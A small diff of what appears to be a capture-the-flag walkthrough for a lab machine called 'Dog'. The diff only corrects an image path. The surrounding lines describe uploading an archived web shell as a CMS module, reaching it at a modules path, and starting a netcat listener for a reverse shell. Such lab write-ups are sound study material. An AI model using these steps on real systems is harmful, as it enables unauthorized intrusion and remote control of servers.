@@ -124,7 +124,7 @@ $ tar -czf shell.tar.gz shell
 ```
 - select `Upload a module...` option and upload the archived shell directory 
 - access the web shell via `/modules/shell/shell.php` 
-![[web shell.png]]
+![[Easy/Unix/Dog/web shell.png]]
 - load a revershell and run `whoami`
 ```
 $ nc -lvnp 4444
